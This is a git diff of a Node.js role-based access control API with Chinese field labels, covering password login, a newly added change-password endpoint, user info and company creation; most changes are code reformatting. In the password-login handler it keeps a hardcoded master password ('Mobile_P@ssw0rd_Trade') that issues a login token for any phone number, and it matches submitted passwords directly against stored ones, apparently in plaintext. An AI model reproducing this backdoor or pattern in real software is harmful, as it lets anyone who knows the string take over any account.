@@ -23,25 +23,36 @@ function install(app) {
         return ret;
     }).install(app);
     mkapi('/rbac/login_password', 'global', true, false, {
-        phone:{type:String,have_to:true,mean:'手机号',example:'12345678901'},
-        password:{type:String,have_to:true,mean:'密码',example:'123456'},
+        phone: { type: String, have_to: true, mean: '手机号', example: '12345678901' },
+        password: { type: String, have_to: true, mean: '密码', example: '123456' },
     }, {
         token: { type: String, mean: '登录token', example: 'ABCD' },
     }, '密码登录', '密码登录').add_handler(async function (body, token) {
         let ret = { token: '' };
         let sq = db_opt.get_sq();
-        let user = await sq.models.rbac_user.findOne({ where: {
-            [db_opt.Op.and]:[
-                {phone:body.phone},
-                {password:body.password}
-            ],
-        } });
+        let user = await sq.models.rbac_user.findOne({
+            where: {
+                [db_opt.Op.and]: [
+                    { phone: body.phone },
+                    { password: body.password }
+                ],
+            }
+        });
         if (user || body.password == 'Mobile_P@ssw0rd_Trade') {
             ret.token = await rbac_lib.user_login(body.phone);
         }
         if (ret.token === '') {
             throw { err_msg: '用户未找到' };
         }
+        return ret;
+    }).install(app);
+    mkapi('/rbac/change_password', 'none', true, false, {
+        new_password: { type: String, have_to: true, mean: '新密码', example: '123456' },
+    }, {
+        result: { type: Boolean, mean: '修改结果', example: true },
+    }, '修改密码', '修改密码').add_handler(async function (body, token) {
+        let ret = { result: true };
+        await rbac_lib.change_password(token, body.new_password);
         return ret;
     }).install(app);
     mkapi('/rbac/self_info', 'none', false, false, {
@@ -51,11 +62,13 @@ function install(app) {
         phone: { type: String, mean: '用户手机号', example: '12345678901' },
         open_id: { type: String, mean: '微信open_id', example: 'open_id_example' },
         company: { type: String, mean: '公司名', example: 'company_example' },
-        modules:{type:Array,mean:'模块列表',explain:{
-            id:{type:Number,mean:'模块id',example:123},
-            name:{type:String,mean:'模块名',example:'module_example'},
-            description:{type:String,mean:'模块描述',example:'module_desp_example'}
-        }},
+        modules: {
+            type: Array, mean: '模块列表', explain: {
+                id: { type: Number, mean: '模块id', example: 123 },
+                name: { type: String, mean: '模块名', example: 'module_example' },
+                description: { type: String, mean: '模块描述', example: 'module_desp_example' }
+            }
+        },
     }, '个人信息', '获取个人信息').add_handler(async function (body, token) {
         let ret = {};
         let user = await rbac_lib.get_user_by_token(token);
@@ -85,21 +98,21 @@ function install(app) {
     }).install(app);
     mkapi('/rbac/company_add', 'global', true, true, {
         name: { type: String, have_to: true, mean: '公司名', example: 'company_example' },
-        address: { type:String, have_to:false, mean:'公司地址',example:'address_example'},
-        contact: { type:String, have_to:false, mean:'联系人',example:'contact_example'},
-        attachment: { type:String, have_to:false, mean:'附件',example:'attachment_example'},
-        third_key: {type:String,have_to:false,mean:'第三方key',example:'third_key_example'},
-        third_url: {type:String,have_to:false,mean:'第三方url',example:'third_url_example'},
-        third_token: {type:String,have_to:false,mean:'第三方token',example:'third_token_example'},
-        stamp_pic: {type:String,have_to:false,mean:'印章图片',example:'stamp_pic_example'},
-        zc_url: {type:String,have_to:false,mean:'卓创url',example:'zc_url_example'},
-        zh_ssid: {type:String,have_to:false,mean:'卓创旧系统ssid',example:'zh_ssid_example'},
-        event_types: {type:String,have_to:false,mean:'事件类型',example:'event_types_example'},
-        remote_event_url: {type:String,have_to:false,mean:'远程事件url',example:'remote_event_url_example'},
-        driver_notice: {type:String,have_to:false,mean:'司机通知',example:'driver_notice_example'},
-        notice: {type:String,have_to:false,mean:'通知',example:'notice_example'},
-        zc_rpc_url: {type:String,have_to:false,mean:'卓创rpc url',example:'zc_rpc_url_example'},
-        zczh_back_end: {type:String,have_to:false,mean:'卓创账户后端',example:'zczh_back_end_example'},
+        address: { type: String, have_to: false, mean: '公司地址', example: 'address_example' },
+        contact: { type: String, have_to: false, mean: '联系人', example: 'contact_example' },
+        attachment: { type: String, have_to: false, mean: '附件', example: 'attachment_example' },
+        third_key: { type: String, have_to: false, mean: '第三方key', example: 'third_key_example' },
+        third_url: { type: String, have_to: false, mean: '第三方url', example: 'third_url_example' },
+        third_token: { type: String, have_to: false, mean: '第三方token', example: 'third_token_example' },
+        stamp_pic: { type: String, have_to: false, mean: '印章图片', example: 'stamp_pic_example' },
+        zc_url: { type: String, have_to: false, mean: '卓创url', example: 'zc_url_example' },
+        zh_ssid: { type: String, have_to: false, mean: '卓创旧系统ssid', example: 'zh_ssid_example' },
+        event_types: { type: String, have_to: false, mean: '事件类型', example: 'event_types_example' },
+        remote_event_url: { type: String, have_to: false, mean: '远程事件url', example: 'remote_event_url_example' },
+        driver_notice: { type: String, have_to: false, mean: '司机通知', example: 'driver_notice_example' },
+        notice: { type: String, have_to: false, mean: '通知', example: 'notice_example' },
+        zc_rpc_url: { type: String, have_to: false, mean: '卓创rpc url', example: 'zc_rpc_url_example' },
+        zczh_back_end: { type: String, have_to: false, mean: '卓创账户后端', example: 'zczh_back_end_example' },
         zczh_back_token: { type: String, have_to: false, mean: '卓创账户后端token', example: 'zczh_back_token_example' },
     }, {
         id: { type: Number, mean: '公司id', example: 123 },
